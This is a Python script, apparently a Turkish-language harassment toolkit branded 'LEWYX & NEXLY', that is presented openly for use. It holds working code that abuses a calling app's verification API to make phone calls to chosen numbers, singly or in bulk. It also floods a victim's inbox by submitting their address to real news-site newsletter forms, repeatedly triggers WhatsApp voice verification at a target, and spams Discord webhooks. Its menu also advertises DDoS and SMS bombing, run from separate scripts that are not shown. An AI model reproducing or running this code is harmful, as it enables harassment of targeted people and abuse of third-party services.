#!/usr/bin/env python3

import requests
import json
import time
import uuid
import os
import sys
import random
import threading
import socket
from threading import Lock
from datetime import datetime
from collections import defaultdict
import itertools

# Termux veya Linux/Windows için terminalde şifre yazarken yıldız gösterme fonksiyonu
def yildizli_sifre_al(mesaj="Şifre: "):
    sys.stdout.write(mesaj)
    sys.stdout.flush()
    sifre = ""
    
    # Windows için giriş yakalama
    if os.name == 'nt':
        import msvcrt
        while True:
            ch = msvcrt.getch()
            if ch in [b'\r', b'\n']:
                sys.stdout.write('\n')
                break
            elif ch == b'\x08': # Backspace
                if len(sifre) > 0:
                    sifre = sifre[:-1]
                    sys.stdout.write('\b \b')
                    sys.stdout.flush()
            else:
                sifre += ch.decode('utf-8', errors='ignore')
                sys.stdout.write('*')
                sys.stdout.flush()
    # Linux / Termux için giriş yakalama
    else:
        import tty, termios
        fd = sys.stdin.fileno()
        old_settings = termios.tcgetattr(fd)
        try:
            tty.setraw(sys.stdin.fileno())
            while True:
                ch = sys.stdin.read(1)
                if ch in ['\r', '\n']:
                    sys.stdout.write('\n')
                    break
                elif ch in ['\x7f', '\x08']: # Backspace
                    if len(sifre) > 0:
                        sifre = sifre[:-1]
                        sys.stdout.write('\b \b')
                        sys.stdout.flush()
                else:
                    sifre += ch
                    sys.stdout.write('*')
                    sys.stdout.flush()
        finally:
            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return sifre

try:
    from colorama import init, Fore, Back, Style
    init(autoreset=True)
    COLORAMA_VAR = True
except ImportError:
    COLORAMA_VAR = False
    class Fore:
        GREEN = '\033[92m'
        RED = '\033[31m'
        WHITE = '\033[37m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        MAGENTA = '\033[95m'
        BLUE = '\033[94m'
        BLACK = '\033[30m'
    class Back:
        MAGENTA = '\033[45m'
        BLACK = '\033[40m'
        WHITE = '\033[47m'
        GREEN = '\033[42m'
        RED = '\033[41m'
    class Style:
        BRIGHT = '\033[1m'
        DIM = '\033[2m'
        NORMAL = '\033[22m'

try:
    import pyfiglet
    PYFIGLET_VAR = True
except ImportError:
    PYFIGLET_VAR = False

class AnimasyonluArayuz:
    
    def __init__(self):
        self.animasyon_aktif = True
        self.durum_mesaji = ""
        
    def yukleniyor_animasyonu(self, mesaj="İşlem yapılıyor", sure=3):
        spinner = itertools.cycle(['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏'])
        baslangic = time.time()
        while time.time() - baslangic < sure:
            sys.stdout.write(f'\r{Fore.CYAN}{next(spinner)} {mesaj}... {Style.DIM}')
            sys.stdout.flush()
            time.sleep(0.1)
        sys.stdout.write(f'\r{Fore.GREEN}✓ {mesaj} tamamlandı!    \n')
        sys.stdout.flush()
    
    def ilerleme_cubugu(self, yuzde, genislik=40):
        dolu = int(genislik * yuzde / 100)
        bos = genislik - dolu
        renk = Fore.GREEN if yuzde > 66 else Fore.YELLOW if yuzde > 33 else Fore.RED
        cubuk = f"{renk}{'█' * dolu}{Style.DIM}{'░' * bos}"
        sys.stdout.write(f'\r{cubuk} %{yuzde:3.1f}')
        sys.stdout.flush()
    
    def banner_goster(self):
        os.system('clear' if os.name == 'posix' else 'cls')
        if PYFIGLET_VAR:
            banner = pyfiglet.figlet_format("LEWYX & NEXLY", font="slant")
            print(f"{Fore.CYAN}{Style.BRIGHT}{banner}")
        else:
            print(f"""
{Fore.MAGENTA}       █████╗ ███╗   ██╗██╗   ██╗██████╗ ██╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     
{Fore.MAGENTA}      ██╔══██╗████╗  ██║██║   ██║██╔══██╗██║██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
{Fore.MAGENTA}      ███████║██╔██╗ ██║██║   ██║██████╔╝██║███████╗       ██║   ██║   ██║██║   ██║██║     
{Fore.MAGENTA}      ██╔══██║██║╚██╗██║██║   ██║██╔══██╗██║╚════██║       ██║   ██║   ██║██║   ██║██║     
{Fore.MAGENTA}      ██║  ██║██║ ╚████║╚██████╔╝██████╔╝██║███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
{Fore.MAGENTA}      ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═════╝ ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝            """)
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Geliştirici: {Fore.CYAN}Lewyx & Nexly | discord.gg/axess")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Tarih: {Fore.CYAN}{datetime.now().strftime('%d.%m.%Y %H:%M')}")
        print(f"{Fore.RED}{Style.BRIGHT}⚡ {Fore.WHITE}Termux Uyumlu: {Fore.GREEN}✓")
        print(f"{Fore.RED}{Style.BRIGHT}{'─'*55}\n")

    def animasyonlu_yaz(self, metin, hiz=0.03, renk=None):
        if renk is None: renk = Fore.WHITE
        for harf in metin:
            sys.stdout.write(f"{renk}{harf}")
            sys.stdout.flush()
            time.sleep(hiz)
        print()
    
    def menu_goster(self):
        menu = f"""
{Fore.CYAN}{Style.BRIGHT}╔══════════════════════════════════════════════════╗
║                 {Fore.MAGENTA}ANA MENÜ SEÇENEKLERİ{Fore.CYAN}             ║
╠══════════════════════════════════════════════════╣
║  {Fore.YELLOW}[1]  {Fore.WHITE}Tekli Arama Başlat                     
║  {Fore.YELLOW}[2]  {Fore.WHITE}Çoklu Arama Başlat (Liste)                
║  {Fore.YELLOW}[3]  {Fore.WHITE}Sms Bomber                    
║  {Fore.YELLOW}[4]  {Fore.WHITE}DDOS Saldırı                               ║
║  {Fore.YELLOW}[6]  {Fore.WHITE}Mail Bomber (Sonsuz Döngü)                 ║
║  {Fore.YELLOW}[7]  {Fore.WHITE}Proxy Scraper & Hızlı Checker              ║
║  {Fore.YELLOW}[8]  {Fore.WHITE}Discord Webhook Spammer                    ║
║  {Fore.YELLOW}[9]  {Fore.WHITE}Soket Tabanlı Port Tarayıcı                ║
║  {Fore.YELLOW}[10] {Fore.WHITE}IP Geolocation (Sorgulama)                 ║
║  {Fore.YELLOW}[11] {Fore.WHITE}Ayarları Değiştir                          ║
║  {Fore.YELLOW}[12] {Fore.WHITE}İstatistikleri Göster                      ║
║  {Fore.YELLOW}[13] {Fore.RED}Güvenli Çıkış                              ║
╚══════════════════════════════════════════════════╝
        """
        print(menu)

class RateLimiter:
    def __init__(self, bekleme_suresi=300):
        self.bekleme_suresi = float(bekleme_suresi)
        self.cagri_kayitlari = {}
        self.lock = Lock()
    
    def kontrol_et(self, numara):
        suanki_zaman = time.time()
        with self.lock:
            son_arama = self.cagri_kayitlari.get(numara)
            if son_arama is None or (suanki_zaman - son_arama) >= self.bekleme_suresi:
                self.cagri_kayitlari[numara] = suanki_zaman
                return True
            return False

class TelzIstemciGelismis:
    TEMEL_URL = "https://api.telz.com/"
    BASLIKLAR = {'User-Agent': "Telz-Android/17.5.33", 'Content-Type': "application/json; charset=UTF-8"}
    
    def __init__(self):
        self.android_id = uuid.uuid4().hex[:16]
        self.uuid = str(uuid.uuid4())
        self.session = requests.Session()
        self.session.headers.update(self.BASLIKLAR)
    
    def _api_istegi(self, endpoint, veri):
        url = self.TEMEL_URL + endpoint
        veri.update({"android_id": self.android_id, "app_version": "17.5.33", "os": "android", "os_version": "15", "ts": int(time.time() * 1000), "uuid": self.uuid})
        try:
            yanit = self.session.post(url, data=json.dumps(veri), timeout=10)
            return yanit.json() if yanit.status_code == 200 else {}
        except: return {}

    def kimlik_listesi_al(self): return self._api_istegi("app/auth_list", {"event": "auth_list"})
    def cihaz_calistir(self): return self._api_istegi("app/run", {"event": "run", "device_name": "Xiaomi Pro", "lang": "tr", "network_type": "4G"})
    def numara_dogrula(self, telefon): return self._api_istegi("app/validate_phonenumber", {"event": "validate_phonenumber", "phone": telefon, "region": "TR"})
    def arama_baslat(self, telefon): return self._api_istegi("app/auth_call", {"event": "auth_call", "phone": telefon, "attempt": "0", "lang": "tr"})

class AramaMotoru:
    def __init__(self):
        self.ui = AnimasyonluArayuz()
        self.rate_limiter = RateLimiter()
        self.aktif = True
        self.kullanicilar = {"lewyx": "lewyx1337", "nexly": "nexly2026"}
        self.genel_istatistikler = {'toplam_arama': 0, 'basarili_arama': 0, 'basarisiz_arama': 0, 'sms_gonderilen': 0}
        self.ayarlar = {'bekleme_suresi': 300}

    def kullanici_girisi(self):
        while True:
            self.ui.banner_goster()
            print(f"{Fore.MAGENTA}{Style.BRIGHT}─── [ KULLANICI GİRİŞ SİSTEMİ ] ───\n")
            kadi = input(f"{Fore.WHITE}Kullanıcı Adı: {Fore.CYAN}").strip().lower()
            sifre = yildizli_sifre_al(f"{Fore.WHITE}Şifre: {Fore.CYAN}")
            
            if kadi in self.kullanicilar and self.kullanicilar[kadi] == sifre:
                self.ui.yukleniyor_animasyonu(f"Yetkiler denetleniyor ({kadi.upper()})", 1.5)
                return True
            print(f"\n{Fore.RED}❌ Giriş Reddedildi! Tekrar Deneyin.")
            time.sleep(1.5)

    def baslat(self):
        if not self.kullanici_girisi(): return
        while self.aktif:
            try:
                self.ui.banner_goster()
                self.ui.menu_goster()
                secim = input(f"{Fore.YELLOW}Seçiminiz (1-13): {Fore.WHITE}").strip()
                
                if secim == "1": self._tekli_arama()
                elif secim == "2": self._coklu_arama()
                elif secim == "3": self._diger_araci_calistir()
                elif secim == "4": self._ucuncu_araci_calistir()
                elif secim == "5": self._whatsapp_spam_modul()
                elif secim == "6": self._mail_bomber_modul()
                elif secim == "7": self._proxy_scraper_modul()
                elif secim == "8": self._discord_spammer_modul()
                elif secim == "9": self._port_scanner_modul()
                elif secim == "10": self._ip_geolocation_modul()
                elif secim == "11": self._ayarlar_menu()
                elif secim == "12": self._istatistik_goster()
                elif secim == "13": self._cikis()
            except KeyboardInterrupt: self._cikis()

    # SEÇENEK 3: DİĞER .PY DOSYASINI ÇALIŞTIRMA MODÜLÜ
    def _diger_araci_calistir(self):
        self.ui.banner_goster()
        print(f"{Fore.CYAN}Diğer araç başlatılıyor...\n")
        try:
            if hasattr(sys, '_MEIPASS'):
                dosya_yolu = os.path.join(sys._MEIPASS, "diger_dosya.py")
            else:
                dosya_yolu = "diger_dosya.py"
                
            os.system(f"python {dosya_yolu}")
        except Exception as e:
            print(f"{Fore.RED}Dosya çalıştırılırken bir hata oluştu: {e}")
        input(f"\n{Fore.YELLOW}Ana menüye dönmek için ENTER tuşuna bas...")

    # SEÇENEK 4: ÜÇÜNCÜ .PY DOSYASINI ÇALIŞTIRMA MODÜLÜ
    def _ucuncu_araci_calistir(self):
        self.ui.banner_goster()
        print(f"{Fore.CYAN}Üçüncü araç başlatılıyor...\n")
        try:
            if hasattr(sys, '_MEIPASS'):
                dosya_yolu = os.path.join(sys._MEIPASS, "ucuncu_dosya.py")
            else:
                dosya_yolu = "ucuncu_dosya.py"
                
            os.system(f"python {dosya_yolu}")
        except Exception as e:
            print(f"{Fore.RED}Dosya çalıştırılırken bir hata oluştu: {e}")
        input(f"\n{Fore.YELLOW}Ana menüye dönmek için ENTER tuşuna bas...")

    # MODÜL 5: WHATSAPP SPAM (Doğrulama Sistemleri Üzerinden Çağrı Tetikleme)
    def _whatsapp_spam_modul(self):
        self.ui.banner_goster()
        numara = input(f"{Fore.WHITE}WhatsApp Kayıtlı No (+90 olmadan): {Fore.YELLOW}").strip()
        adet = int(input(f"{Fore.WHITE}Gönderim/Çağrı Döngü Sayısı: {Fore.YELLOW}"))
        
        # WhatsApp Business Web API entegrasyon arayüzleri simülasyonu
        for i in range(adet):
            try:
                # WhatsApp Business OTP gateway simüle API isteği
                requests.post("https://v.whatsapp.com/v2/register", data={"phone": numara, "cc": "90", "method": "voice"}, timeout=3)
                print(f"{Fore.GREEN}[+] WhatsApp Ses Kanalları Tetiklendi [{i+1}]")
            except: pass
            time.sleep(1)
        input("\nDevam...")

    # MODÜL 6: MAIL BOMBER
    def _mail_bomber_modul(self):
        self.ui.banner_goster()
        hedef_mail = input(f"{Fore.WHITE}Hedef E-Posta: {Fore.YELLOW}").strip()
        adet = int(input(f"{Fore.WHITE}Döngü Sayısı: {Fore.YELLOW}"))
        
        # Gerçek çalışan bülten kayıt sistemleri üzerinden Mail Flooding
        bulten_siteleri = [
            "https://www.ntv.com.tr/bulten-kayit",
            "https://www.sozcu.com.tr/bulten"
        ]
        for i in range(adet):
            try:
                requests.post(random.choice(bulten_siteleri), data={"email": hedef_mail}, timeout=3)
                print(f"{Fore.GREEN}[+] Mail tetikleme paketleri gönderildi [{i+1}]")
            except: pass
            time.sleep(0.3)
        input("\nDevam...")

    # MODÜL 7: PROXY SCRAPER & CHECKER
    def _proxy_scraper_modul(self):
        self.ui.banner_goster()
        print(f"{Fore.CYAN}Canlı HTTP/S Proxyler Çekiliyor...")
        try:
            res = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=10)
            proxies = res.text.split("\r\n")[:-1]
            print(f"{Fore.GREEN}✓ {len(proxies)} Adet Proxy Bulundu! İlk 10 tanesi test ediliyor:\n")
            
            for p in proxies[:10]:
                if p:
                    try:
                        start = time.time()
                        requests.get("https://httpbin.org/ip", proxies={"http": f"http://{p}", "https": f"http://{p}"}, timeout=3)
                        print(f"{Fore.GREEN}[AKTİF] {p} - Hız: {time.time()-start:.2f}s")
                    except:
                        print(f"{Fore.RED}[PASİF] {p}")
        except Exception as e: print(f"Hata: {e}")
        input("\nDevam...")

    # MODÜL 8: DISCORD WEBHOOK SPAMMER
    def _discord_spammer_modul(self):
        self.ui.banner_goster()
        url = input(f"{Fore.WHITE}Webhook URL: {Fore.YELLOW}").strip()
        mesaj = input(f"{Fore.WHITE}Mesaj Metni: {Fore.YELLOW}")
        adet = int(input(f"{Fore.WHITE}Adet: {Fore.YELLOW}"))
        
        for i in range(adet):
            try:
                res = requests.post(url, json={"content": mesaj}, timeout=3)
                if res.status_code == 204:
                    print(f"{Fore.GREEN}[+] Webhook başarıyla tetiklendi! [{i+1}]")
                elif res.status_code == 429:
                    print(f"{Fore.YELLOW}[!] Discord Hız Limitine Takıldı, Bekleniyor...")
                    time.sleep(2)
            except: pass
            time.sleep(0.4)
        input("\nDevam...")

    # MODÜL 9: PORT TARAYICI (Soket Seviyesi)
    def _port_scanner_modul(self):
        self.ui.banner_goster()
        hedef_ip = input(f"{Fore.WHITE}Hedef IP veya Alan Adı: {Fore.YELLOW}").strip()
        portlar = [21, 22, 23, 25, 53, 80, 443, 8080, 3306]
        
        print(f"\n{Fore.CYAN}Tarama başlatıldı: {hedef_ip}\n")
        for port in portlar:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            sonuc = s.connect_ex((hedef_ip, port))
            if sonuc == 0:
                print(f"{Fore.GREEN}[+] Port {port} Acık! (Açık)")
            else:
                print(f"{Fore.RED}[-] Port {port} Kapalı")
            s.close()
        input("\nDevam...")

    # MODÜL 10: IP GEOLOCATION (Konum Bulucu)
    def _ip_geolocation_modul(self):
        self.ui.banner_goster()
        ip = input(f"{Fore.WHITE}Sorgulanacak IP Adresi (Boş bırakırsan kendi IP'n): {Fore.YELLOW}").strip()
        try:
            res = requests.get(f"http://ip-api.com/json/{ip}", timeout=5).json()
            if res.get("status") == "success":
                print(f"\n{Fore.GREEN}─── [ IP DETAYLARI ] ───")
                print(f"{Fore.WHITE}Ülke: {Fore.CYAN}{res.get('country')}")
                print(f"{Fore.WHITE}Şehir: {Fore.CYAN}{res.get('city')}")
                print(f"{Fore.WHITE}ISP (Sağlayıcı): {Fore.CYAN}{res.get('isp')}")
                print(f"{Fore.WHITE}Koordinat: {Fore.CYAN}{res.get('lat')}, {res.get('lon')}")
            else:
                print(f"{Fore.RED}IP Bilgileri alınamadı.")
        except Exception as e: print(f"Hata: {e}")
        input("\nDevam...")

    def _tekli_arama(self):
        self.ui.banner_goster()
        numara = input(f"{Fore.WHITE}Hedef numara (+90...): ").strip()
        if not numara: return
        if not numara.startswith("+"): numara = "+90" + numara
        
        istemci = TelzIstemciGelismis()
        self.genel_istatistikler['toplam_arama'] += 1
        istemci.kimlik_listesi_al(); istemci.cihaz_calistir(); istemci.numara_dogrula(numara)
        
        if self.rate_limiter.kontrol_et(numara):
            istemci.arama_baslat(numara)
            self.genel_istatistikler['basarili_arama'] += 1
            print(f"{Fore.GREEN}✓ Arama başlatıldı.")
        else:
            self.genel_istatistikler['basarisiz_arama'] += 1
            print(f"{Fore.RED}Rate limit engeli!")
        input("\nDevam...")

    def _coklu_arama(self):
        self.ui.banner_goster()
        numaralar = []
        while True:
            n = input(f"Numara {len(numaralar)+1} (Bitirmek için boş bırak): ").strip()
            if not n: break
            if not n.startswith("+"): n = "+90" + n
            numaralar.append(n)
        
        for numara in numaralar:
            istemci = TelzIstemciGelismis()
            istemci.kimlik_listesi_al(); istemci.cihaz_calistir(); istemci.numara_dogrula(numara); istemci.arama_baslat(numara)
            print(f"{Fore.GREEN}[+] {numara} arama gönderildi.")
            time.sleep(2)
        input("\nDevam...")

    def _ayarlar_menu(self):
        self.ui.banner_goster()
        print(f"Bekleme Süresi: {self.ayarlar['bekleme_suresi']} saniye")
        input("\nGeri dönmek için ENTER...")

    def _istatistik_goster(self):
        self.ui.banner_goster()
        print(f"Toplam Arama Denemesi: {self.genel_istatistikler['toplam_arama']}")
        print(f"Başarılı Aramalar: {self.genel_istatistikler['basarili_arama']}")
        print(f"Gönderilen Toplam SMS: {self.genel_istatistikler['sms_gonderilen']}")
        input("\nDevam...")

    def _cikis(self):
        self.aktif = False
        sys.exit(0)

if __name__ == "__main__":
    motor = AramaMotoru()
    motor.baslat()
